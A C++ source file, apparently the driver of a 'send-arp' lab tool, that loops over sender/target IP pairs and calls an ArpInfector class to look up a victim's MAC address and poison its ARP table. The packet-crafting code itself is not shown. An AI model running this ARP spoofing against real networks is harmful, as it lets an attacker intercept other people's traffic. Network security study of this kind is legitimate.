#include <cstdio>
#include <pcap.h>
#include "arpInfector.h"
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4) { // <=?
        usage();
        return -1;
    }

    char* device = argv[1];
    Ip sender_ip;
    Ip target_ip;

    Ip* sender_ip_ptr = &sender_ip;
    Ip* target_ip_ptr = &target_ip;

    for (int i=2; i < argc; i+=2) {
        *sender_ip_ptr = Ip(argv[i]);
        *target_ip_ptr = Ip(argv[i+1]);

        ArpInfector* arpInfector = new ArpInfector(device, sender_ip_ptr, target_ip_ptr);

        arpInfector->get_victim_MAC();
        arpInfector->infect_victim_ARP_table();

        delete arpInfector;
    }

    return 0;
}

